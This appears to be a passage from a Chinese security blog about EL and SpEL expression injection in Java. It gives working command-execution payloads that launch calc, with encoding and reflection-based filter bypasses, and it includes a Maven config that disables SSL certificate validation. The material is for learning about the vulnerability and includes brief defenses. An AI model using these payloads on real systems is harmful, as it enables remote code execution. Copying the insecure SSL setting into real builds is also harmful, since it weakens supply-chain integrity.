\u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;source\u0026gt;${maven.compiler.source}\u0026lt;/source\u0026gt; \u0026lt;target\u0026gt;${maven.compiler.target}\u0026lt;/target\u0026gt; \u0026lt;encoding\u0026gt;UTF-8\u0026lt;/encoding\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-war-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.4\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;failOnMissingWebXml\u0026gt;false\u0026lt;/failOnMissingWebXml\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; 之后使用 maven 进行构建 .war 包用于 tomcat 运行。\n这里使用 maven 时遇到一个 SSL 证书验证的问题，这里更改配置文件 setting.xml 禁用验证。\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;settings\u0026gt; \u0026lt;profiles\u0026gt; \u0026lt;profile\u0026gt; \u0026lt;id\u0026gt;insecure\u0026lt;/id\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.wagon.http.ssl.insecure\u0026gt;true\u0026lt;/maven.wagon.http.ssl.insecure\u0026gt; \u0026lt;maven.wagon.http.ssl.allowall\u0026gt;true\u0026lt;/maven.wagon.http.ssl.allowall\u0026gt; \u0026lt;maven.wagon.http.ssl.ignore.validity.dates\u0026gt;true\u0026lt;/maven.wagon.http.ssl.ignore.validity.dates\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;/profile\u0026gt; \u0026lt;/profiles\u0026gt; \u0026lt;activeProfiles\u0026gt; \u0026lt;activeProfile\u0026gt;insecure\u0026lt;/activeProfile\u0026gt; \u0026lt;/activeProfiles\u0026gt; \u0026lt;/settings\u0026gt; 将以上文本复制到 C:\\Users\\\u0026lt;用户名\u0026gt;\\.m2\\settings.xml 文件中，之后执行 maven 就可以了\n部署 Tomcat 服务器：\n2.3.2 漏洞原理 命令执行PoC如下：\njava\r1 \u0026lt;spring:message text=\u0026#34;${/\u0026#34;/\u0026#34;.getClass().forName(/\u0026#34;java.lang.Runtime/\u0026#34;).getMethod(/\u0026#34;getRuntime/\u0026#34;,null).invoke(null,null).exec(/\u0026#34;calc/\u0026#34;,null).toString()}\u0026#34;\u0026gt;\u0026lt;/spring:message\u0026gt; 正常情况下为：\njava\r1 2 \u0026lt;%@ taglib uri=\u0026#34;http://www.springframework.org/tags\u0026#34; prefix=\u0026#34;spring\u0026#34;%\u0026gt; \u0026lt;spring:message text=\u0026#34;${param.a}\u0026#34;\u0026gt;\u0026lt;/spring:message\u0026gt; 这里使用 message 标签，text 属性用 el表达式从请求参数中取值，这样当访问\njava\r1 http://localhost/test.jsp?a=${applicationScope} ${applicationScope} 这段字符串会被当做 el表达式被执行，而不是作为字符串直接显示在页面上，我们改变提交的 el表达式，就可以获取我们需要的信息了，这就达到了 el表达式注入的效果。\n3、EL表达式的EXP与基础绕过 3.1 基础 EXP java\r1 \u0026#34;${\u0026#39;\u0026#39;.getClass().forName(\u0026#39;java.lang.Runtime\u0026#39;).getMethod(\u0026#39;exec\u0026#39;,\u0026#39;\u0026#39;.getClass()).invoke(\u0026#39;\u0026#39;.getClass().forName(\u0026#39;java.lang.Runtime\u0026#39;).getMethod(\u0026#39;getRuntime\u0026#39;).invoke(null),\u0026#39;calc.exe\u0026#39;)}\u0026#34; 3.2 利用 ScriptEngine 调用 JS 引擎绕过 同 SpEL 注入中讲到的\nScriptEngineExec.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package drunkbaby.basicelvul; import de.odysseus.el.ExpressionFactoryImpl; import de.odysseus.el.util.SimpleContext; import javax.el.ExpressionFactory; import javax.el.ValueExpression; public class ScriptEngineExec { public static void main(String[] args) { ExpressionFactory expressionFactory = new ExpressionFactoryImpl(); SimpleContext simpleContext = new SimpleContext(); // failed // String exp = \u0026#34;${\u0026#39;\u0026#39;.getClass().forName(\u0026#39;java.lang.Runtime\u0026#39;).getRuntime().exec(\u0026#39;calc\u0026#39;)}\u0026#34;; // ok String exp = \u0026#34;${\u0026#39;\u0026#39;.getClass().forName(\\\u0026#34;javax.script.ScriptEngineManager\\\u0026#34;).newInstance().getEngineByName(\\\u0026#34;JavaScript\\\u0026#34;).eval(\\\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#39;Calc.exe\u0026#39;)\\\u0026#34;)}\\n\u0026#34; + \u0026#34; \u0026#34;; ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class); System.out.println(valueExpression.getValue(simpleContext)); } } 利用 Unicode 编码绕过 对可利用的 PoC 进行全部或部分的 Unicode 编码都是 OK 的：\njava\r1 2 // Unicode编码内容为前面反射调用的PoC \\u0024\\u007b\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0027\\u0065\\u0078\\u0065\\u0063\\u0027\\u002c\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0027\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u006e\\u0075\\u006c\\u006c\\u0029\\u002c\\u0027\\u0063\\u0061\\u006c\\u0063\\u002e\\u0065\\u0078\\u0065\\u0027\\u0029\\u007d 利用八进制编码绕过 java\r1 2 // 八进制编码内容为前面反射调用的PoC \\44\\173\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\56\\146\\157\\162\\116\\141\\155\\145\\50\\47\\152\\141\\166\\141\\56\\154\\141\\156\\147\\56\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\147\\145\\164\\115\\145\\164\\150\\157\\144\\50\\47\\145\\170\\145\\143\\47\\54\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\51\\56\\151\\156\\166\\157\\153\\145\\50\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\56\\146\\157\\162\\116\\141\\155\\145\\50\\47\\152\\141\\166\\141\\56\\154\\141\\156\\147\\56\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\147\\145\\164\\115\\145\\164\\150\\157\\144\\50\\47\\147\\145\\164\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\151\\156\\166\\157\\153\\145\\50\\156\\165\\154\\154\\51\\54\\47\\143\\141\\154\\143\\56\\145\\170\\145\\47\\51\\175 JohnFord 师傅的脚本\npython\r1 2 3 4 5 6 str = \u0026#34;${\u0026#39;\u0026#39;.getClass().forName(\u0026#39;java.lang.Runtime\u0026#39;).getMethod(\u0026#39;exec\u0026#39;,\u0026#39;\u0026#39;.getClass()).invoke(\u0026#39;\u0026#39;.getClass().forName(\u0026#39;java.lang.Runtime\u0026#39;).getMethod(\u0026#39;getRuntime\u0026#39;).invoke(null),\u0026#39;calc.exe\u0026#39;)}\u0026#34; result = \u0026#34;\u0026#34; for s in str: num = \u0026#34;\\\\\u0026#34; + oct(ord(s)) result += num print(result.replace(\u0026#34;\\\\0\u0026#34;, \u0026#34;\\\\\u0026#34;)) 4、 防御方法 尽量不使用外部输入的内容作为 EL 表达式内容；\n若使用，则严格过滤EL表达式注入漏洞的 payload 关键字；\n如果是排查 Java 程序中 JUEL 相关代码，则搜索如下关键类方法：\njavax.el.ExpressionFactory.createValueExpression() javax.el.ValueExpression.getValue() 参考： java\u0026mdash;-EL表达式：\nhttps://blog.csdn.net/pan_junbiao/article/details/88567466\nhttps://www.runoob.com/jsp/jsp-expression-language.html\nSpring框架标签EL表达式执行漏洞分析（CVE-2011-2730） – lupin\nhttps://www.vuln.cn/6484\n","permalink":"http://localhost:1313/xvsf/posts/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","summary":"\u003ch1 id=\"el-表达式注入\"\u003eEL 表达式注入\u003c/h1\u003e\n\u003ch1 id=\"1el-概述\"\u003e1、EL 概述\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003e表达式语言(Expression Language)\u003c/strong\u003e 简称  EL，是 Java EE（尤其是 JSP 技术）中用来\u003cstrong\u003e在页面中简化访问 Java 对象、属性、集合和方法\u003c/strong\u003e的一种语法。它的主要作用是取代 JSP 页面中复杂的 \u003ccode\u003e\u0026lt;%= ... %\u0026gt;\u003c/code\u003e 表达式，让 JSP 页面更简洁、可读性更高。\u003c/p\u003e","title":"EL 表达式注入"},{"content":"SpEL 表达式注入 1、SpEL 基础 1.1 简介 在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），是一种强大的运行时查询和操作对象图的语言，语法类似于Jakarta表达语句，但额外支持方法调用和基本字符串模板。SpEL旨在为Spring社区提供一种统一且功能全面的表达式语言，适用于所有Spring产品，并根据这些产品的需要设计了其特性。尽管SpEL是Spring框架的一部分，但它可以独立于Spring使用。通常情况下，用户只需编写简单的表达式字符串即可利用SpEL的功能，无需关心底层架构细节。例如，在基于XML或注解的bean定义中集成SpEL就是一个常见应用。\nSpEL 表达式必须使用占位符语法 #{SpelExpression}，以便它们可以嵌入到纯文本字符串中（换句话说，SpEL 启用了表达式模板）。\nSpEL 还可使用 @BeanID语法在注册表中查找 Bean （通常是 Spring 注册表）。例如，使用 ID、headerUtils 和方法 count （） （计数当前消息中的标头数）指定 bean，可以在 SpEL predicate 中使用 headerUtils bean，如下所示：\nplain\r1 #{@headerUtils.count \u0026gt; 4} 1.2 表达式类型 1.2.1 字面值 最简单的 SpEL 表达式就是仅包含一个字面值。\n下面我们在 XML 配置文件中使用 SpEL 设置类属性的值为字面值，此时需要用到 #{} 定界符，注意若是指定为字符串的话需要添加单引号括起来：\nxml\r1 2 \u0026lt;property name=\u0026#34;message1\u0026#34; value=\u0026#34;#{666}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;message1\u0026#34; value=\u0026#34;#{aaaa}\u0026#34;/\u0026gt; 还可以直接与字符串混用：\nxml\r1 \u0026lt;property name=\u0026#34;message1\u0026#34; value=\u0026#34;the value is #{666}\u0026#34;/\u0026gt; 1.2.2 Demo java\r1 2 3 4 5 6 7 8 9 10 11 12 13 package com.src.basicspel; public class HelloWorld { private String message; public void setMessage(String message) { this.message = message; } public void getMessage() { System.out.println(\u0026#34;Your Message :\u0026#34; + message); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.src.basicspel; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; @SpringBootApplication public class BasicSpElApplication { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;Demo.xml\u0026#34;); HelloWorld helloWorld = context.getBean(\u0026#34;helloWorld\u0026#34;, HelloWorld.class); helloWorld.getMessage(); } } xml\r1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;helloWorld\u0026#34; class=\u0026#34;com.src.basicspel.HelloWorld\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;message\u0026#34; value=\u0026#34;#{\u0026#39;aaa\u0026#39;} is #{3333}\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 参考 Drunkbaby 师傅的文章：\n1.3 引用 Bean SpEl 表达式能够通过其他 Bean 的 ID 进行引用，直接在 #{} 符号中写入 ID 名即可，无需添加单引号：\n原来的写法：\u0026lt;constructor-arg ref=\u0026quot;test\u0026quot;/\u0026gt;\n在 SpEL 中：\u0026lt;constructor-arg value=\u0026quot;#{test}\u0026quot;\u0026gt;\n1.3.1 Demo SpellChecker.java\njava\r1 2 3 4 5 6 7 8 9 10 package com.src.basicspel; public class SpellChecker { public SpellChecker() { System.out.println(\u0026#34;Inside SpellChecker constructor.\u0026#34;); } public void checkSpelling() { System.out.println(\u0026#34;Inside checkSpelling.\u0026#34;); } } TextEditor.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.src.basicspel; public class TextEditor { private SpellChecker spellChecker; public TextEditor(SpellChecker spellChecker) { System.out.println(\u0026#34;Inside TextEditor constructor.\u0026#34; ); this.spellChecker = spellChecker; } public void spellCheck() { spellChecker.checkSpelling(); } } RefSpellAndEditor.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 package com.src.basicspel; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class RefSpellAndEditor { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;editor.xml\u0026#34;); TextEditor editor = context.getBean(\u0026#34;textEditor\u0026#34;, TextEditor.class); editor.spellCheck(); } } editor.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \u0026#34;\u0026gt; \u0026lt;!-- Definition for spellChecker bean --\u0026gt; \u0026lt;bean id=\u0026#34;spellChecker\u0026#34; class=\u0026#34;com.src.basicspel.SpellChecker\u0026#34; /\u0026gt; \u0026lt;!-- Definition for textEditor bean --\u0026gt; \u0026lt;bean id=\u0026#34;textEditor\u0026#34; class=\u0026#34;com.src.basicspel.TextEditor\u0026#34;\u0026gt; \u0026lt;!--\u0026lt;constructor-arg ref=\u0026#34;spellChecker\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;constructor-arg value=\u0026#34;#{spellChecker}\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 1.4 引用类属性 SpEL 表达式能够访问类的属性。\n比如， 参赛者 Drunkbaby 是一位模仿高手，Johnford 唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：\nxml\r1 2 3 4 5 6 7 \u0026lt;bean id=\u0026#34;kenny\u0026#34; class=\u0026#34;com.spring.entity.Instrumentalist\u0026#34; p:song=\u0026#34;May Rain\u0026#34; p:instrument-ref=\u0026#34;piano\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;Drunkbaby\u0026#34; class=\u0026#34;com.spring.entity.Instrumentalist\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;instrument\u0026#34; value=\u0026#34;#{kenny.instrument}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;song\u0026#34; value=\u0026#34;#{kenny.song}\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; key 指定 kenny\u0026lt;bean\u0026gt; 的 id value 指定 kenny\u0026lt;bean\u0026gt;的 song 属性。其等价于执行下面的代码：\njava\r1 2 Instrumentalist carl = new Instrumentalist(); carl.setSong(kenny.getSong()); 1.5 引用类方法 SpEL 表达式还可以访问类的方法。\n假设现在有个 SongSelector 类，该类有个 selectSong() 方法，这样的话 Drunkbaby 就可以不用模仿别人，开始唱 songSelector 所选的歌了：\nxml\r1 \u0026lt;property name=\u0026#34;song\u0026#34; value=\u0026#34;#{SongSelector.selectSong()}\u0026#34;/\u0026gt; carl 有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用 toUpperCase() 方法：\nxml\r1 \u0026lt;property name=\u0026#34;song\u0026#34; value=\u0026#34;#{SongSelector.selectSong().toUpperCase()}\u0026#34;/\u0026gt; 注意：这里我们不能确保不抛出 NullPointerException，为了避免这个讨厌的问题，我们可以使用 SpEL 的 null-safe 存取器：\nxml\r1 \u0026lt;property name=\u0026#34;song\u0026#34; value=\u0026#34;#{SongSelector.selectSong()?.toUpperCase()}\u0026#34;/\u0026gt; ?. 符号会确保左边的表达式不会为 null，如果为 null 的话就不会调用 toUpperCase() 方法了。\n1.6 类类型表达式 T(Type) 在 SpEL 表达式中，使用 T(Type) 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。\n使用 T(Type) 来表示 java.lang.Class 实例，Type 必须是类全限定名，但 ”java.lang” 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。\n这里就有潜在的攻击面了 因为我们 java.lang.Runtime 这个包也是包含于 java.lang 的包的，所以如果能调用 Runtime就可以进行命令执行\n在 XML 配置文件中的使用示例，要调用 java.lang.Math 来获取 0~1 的随机数:\ntext\r1 \u0026lt;property name=\u0026#34;random\u0026#34; value=\u0026#34;#{T(java.lang.Math).random()}\u0026#34;/\u0026gt; 简单来说，在 SpEL 中， T(Type) 用于 获取一个 Java 类的 Class 对象，例如：\nT(java.lang.String) 返回 java.lang.String.class。返回 Class 后，就可以调用类的静态方法、获取类的静态字段等等，而 T(Type) 允许任意加载类、调用静态方法，那么也就可以执行敏感操作，例如：T(java.lang.Runtime).getRuntime().exec(\u0026quot;calc\u0026quot;)，如果上下文没有限制 SpEL 的访问类型，那么意味着：SpEL = 远程命令访问。\n1.6.1 Demo 修改 Demo.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;helloWorld\u0026#34; class=\u0026#34;com.src.basicspel.HelloWorld\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;message\u0026#34; value=\u0026#34;#{\u0026#39;aaa\u0026#39;} is #{T(java.lang.Math).random()}\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 1.6.2 恶意调用并执行命令 修改 Value 中的类类型表达式的类为 Runtime 并调用命令执行方法：\nxml\r1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;helloWorld\u0026#34; class=\u0026#34;com.src.basicspel.HelloWorld\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;message\u0026#34; value=\u0026#34;#{\u0026#39;aaa\u0026#39;} is #{T(java.lang.Runtime).getRuntime.exec(\u0026#39;calc\u0026#39;)}\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 2、SpEL 用法 SpEL 的用法有三种形式，一种是在注解 @Value 中；一种是 XML 配置；最后一种是在代码块中使用 Expression。\n2.1 XML 配置 xml\r1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;helloWorld\u0026#34; class=\u0026#34;com.src.basicspel.HelloWorld\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;message\u0026#34; value=\u0026#34;#{\u0026#39;aaa\u0026#39;} is #{T(java.lang.Runtime).getRuntime.exec(\u0026#39;calc\u0026#39;)}\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 2.2 注解 @Value 这种形式的值一般是写在 properties 的配置文件中的。\njava\r1 2 3 4 5 6 7 public class EmailSender { @Value(\u0026#34;${spring.mail.username}\u0026#34;) private String mailUsername; @Value(\u0026#34;#{ systemProperties[\u0026#39;user.region\u0026#39;] }\u0026#34;) private String defaultLocale; //... } 2.3 Expression 用法 java\r1 2 3 4 5 6 7 8 9 //创建解析器 ExpressionParser parser = new SpelExpressionParser(); //解析表达式 Expression expression = parser.parseExpression(\u0026#34;(\u0026#39;Hello\u0026#39; + \u0026#39; Drunkbaby\u0026#39;).concat(#end)\u0026#34;); //构造上下文 EvaluationContext context = new StandardEvaluationContext(); //求值 context.setVariable(\u0026#34;end\u0026#34;, \u0026#34;!\u0026#34;); System.out.println(expression.getValue(context)); 具体步骤如下：\n1、创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现； 2、解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象； 3、构造上下文：准备比如变量定义等等表达式需要的上下文数据； 4、求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；\n主要接口：\nExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符； EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。 Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。 2.3.1 Demo 程序会将这里传入 parseExpression() 函数的字符串参数 spel 作为 SpEL 表达式来解析，而无需通过 #{} 符号来注明\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.src.basicspel; import org.springframework.expression.Expression; import org.springframework.expression.spel.standard.SpelExpressionParser; public class ExpressionCalc { public static void main(String[] args){ String spel = \u0026#34;T(Runtime).getRuntime().exec(\\\u0026#34;calc\\\u0026#34;)\u0026#34;; SpelExpressionParser spelExpressionParser = new SpelExpressionParser(); Expression expression = spelExpressionParser.parseExpression(spel); System.out.println(expression.getValue()); } } 2.3.2 类实例化 类实例化同样使用 Java 关键字 new，类名必须是全限定名，但 java.lang 包内的类型除外。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.src.basicspel; import org.springframework.expression.Expression; import org.springframework.expression.spel.standard.SpelExpressionParser; public class newClass { public static void main(String[] args) { String spel = \u0026#34;new java.util.Date()\u0026#34;; SpelExpressionParser spelExpressionParser = new SpelExpressionParser(); Expression expression = spelExpressionParser.parseExpression(spel); System.out.println(expression.getValue()); } } 3、SpEL 表达式注入漏洞 3.1 漏洞原理 SimpleEvaluationContext 和 StandardEvaluationContext 是 SpEL 提供的两个 EvaluationContext：\nSimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。 StandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。 SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 StandardEvaluationContext 是支持全部 SpEL 语法的。\n由前面的 类类型表达式 知道，SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式 T(Type) 来调用任意类方法。这是因为在不指定 EvaluationContext 的情况下默认采用的是 StandardEvaluationContext，而它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。\n例如 2.3 中的 Demo ：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.src.basicspel; import org.springframework.expression.Expression; import org.springframework.expression.spel.standard.SpelExpressionParser; public class ExpressionCalc { public static void main(String[] args){ String spel = \u0026#34;T(Runtime).getRuntime().exec(\\\u0026#34;calc\\\u0026#34;)\u0026#34;; SpelExpressionParser spelExpressionParser = new SpelExpressionParser(); Expression expression = spelExpressionParser.parseExpression(spel); System.out.println(expression.getValue()); } } 3.2 通过反射的方式进行 SpEL 注入 java\r1 2 3 4 5 6 7 8 public class ReflectBypass { public static void main(String[] args) { String spel = \u0026#34;T(String).getClass().forName(\\\u0026#34;java.lang.Runtime\\\u0026#34;).getRuntime().exec(\\\u0026#34;calc\\\u0026#34;)\u0026#34;; ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(spel); System.out.println(expression.getValue()); } } 3.3 基础 Poc 除了常见的 Runtime 的命令执行方法，还有ProcessBuilder进行命令执行\njava\r1 2 3 4 5 6 7 // Runtime T(java.lang.Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;) T(Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;) // ProcessBuilder new java.lang.ProcessBuilder({\u0026#39;calc\u0026#39;}).start() new ProcessBuilder({\u0026#39;calc\u0026#39;}).start() 3.4 基础 Bypass 3.4.1 常见的 Bypass 技巧 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 反射调用 T(String).getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;calc\u0026#34;) // 同上，需要有上下文环境 #this.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;calc\u0026#34;) // 反射调用+字符串拼接，绕过如javacon题目中的正则过滤 T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;).getMethod(\u0026#34;ex\u0026#34;+\u0026#34;ec\u0026#34;,T(String[])).invoke(T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;).getMethod(\u0026#34;getRu\u0026#34;+\u0026#34;ntime\u0026#34;).invoke(T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;)),new String[]{\u0026#34;cmd\u0026#34;,\u0026#34;/C\u0026#34;,\u0026#34;calc\u0026#34;}) // 同上，需要有上下文环境 #this.getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;).getMethod(\u0026#34;ex\u0026#34;+\u0026#34;ec\u0026#34;,T(String[])).invoke(T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;).getMethod(\u0026#34;getRu\u0026#34;+\u0026#34;ntime\u0026#34;).invoke(T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;)),new String[]{\u0026#34;cmd\u0026#34;,\u0026#34;/C\u0026#34;,\u0026#34;calc\u0026#34;}) // 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1 // byte数组内容的生成后面有脚本 new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start() // 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2 // byte数组内容的生成后面有脚本 